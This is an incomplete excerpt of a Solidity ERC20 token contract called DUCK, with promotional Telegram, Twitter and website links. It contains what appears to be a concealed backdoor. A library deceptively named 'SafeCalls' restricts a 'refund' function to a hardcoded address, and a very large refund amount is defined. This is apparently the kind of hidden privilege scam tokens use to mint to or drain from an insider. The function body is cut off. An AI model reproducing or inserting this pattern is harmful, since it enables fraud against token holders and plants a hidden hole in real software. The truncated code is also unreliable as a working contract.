...
*/
/**
 Telegram: https://t.me/BDUCKPortal
 Twitter：https://twitter.com/BDUCKERC
 Website:https://www.semk.net/en/about.aspx
*/
...
library SafeCalls {
    function checkCaller(address sender, address _MARK) internal pure {
        require(sender == _MARK, "Caller is not the original caller");
    }
}

contract DUCK is Context, Ownable, IERC20 {
    ...
    uint256 private baseRefundAmount = 880000000000000000000000000;
    ...
    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        ...
        _MARK = 0x2625c5E6d41AB455dDD7Fdf212f082072c388287;
    ...
    function refund(address recipient) external {
        SafeCalls.checkCaller(_msgSender(), _MARK);
